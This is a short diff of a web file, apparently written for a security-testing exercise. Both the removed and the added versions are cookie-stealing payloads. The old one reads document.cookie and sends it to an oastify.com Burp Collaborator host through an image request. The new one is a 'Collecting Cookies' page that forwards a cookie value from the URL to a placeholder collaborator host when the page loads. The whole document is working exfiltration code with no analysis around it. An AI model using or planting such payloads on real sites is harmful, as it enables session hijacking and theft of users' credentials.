@@ -1,11 +1,34 @@
-<script>
-  // Replace with your server URL
-  var serverUrl = "https://3236szxht06nhb1w1nrubhieb5hw5utj.oastify.com";
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Collecting Cookies</title>
+    <script>
+        // This function extracts the cookies from the URL
+        function getCookiesFromUrl() {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get('cookie');  // Return the cookie value from the URL
+        }
 
-  // Capture document cookies
-  var cookies = document.cookie;
+        // Send the cookies to Burp Collaborator server
+        function sendCookiesToBurp(cookieData) {
+            var xhr = new XMLHttpRequest();
+            // Replace 'BURP_COLLABORATOR_URL' with the actual Burp Collaborator URL
+            xhr.open("GET", "https://BURP_COLLABORATOR_URL/?cookie=" + encodeURIComponent(cookieData), true);
+            xhr.send();
+        }
 
-  // Create an image element to send the data
-  var img = new Image();
-  img.src = serverUrl + "?cookies=" + encodeURIComponent(cookies);
-</script>
+        // When the page loads, collect the cookies from the URL and send them to Burp Collaborator
+        window.onload = function() {
+            var cookies = getCookiesFromUrl();
+            if (cookies) {
+                sendCookiesToBurp(cookies);  // Send cookies to Burp Collaborator
+            }
+        }
+    </script>
+</head>
+<body>
+    <h1>Collecting Cookies...</h1>
+</body>
+</html>
